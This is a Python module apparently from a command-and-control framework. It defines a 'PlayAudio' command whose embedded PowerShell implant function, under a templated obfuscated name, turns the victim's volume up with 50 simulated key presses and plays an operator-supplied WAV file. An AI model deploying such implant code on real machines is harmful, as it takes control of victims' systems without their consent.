
import os
class PlayAudio:
    type = "PS"
    args = "Local sound file location"
    input = "play_audio"

    def process_implant_response(self, data, args):
        print(data)
        if data.decode()=="1":
            return f"Audio success: {args}", None
        else:
            return f"Audio play failed.", None

    def implant_text(self):
        var = '''
function {{ ron.obf_remote_play_audio }}($data){
    if ($data.length -lt 4){
            $global:tr = 0
        }
    $wshShell = new-object -com wscript.shell;1..50  | % {$wshShell.SendKeys([char]175)}
    $fs = [System.IO.MemoryStream]::new($data)
    $PlayWav = [System.Media.SoundPlayer]::new($fs)
    $PlayWav.play()
    $PlayWav.Dispose()
    $global:tr = 1
}
'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        path = f"{os.getcwd()}/Storage/implant_resources/{argument_string}"
        file_exists = os.path.exists(path)
        if file_exists:
            return True
        else:
            return f"WAV file does not exist: {path}"
        # return True


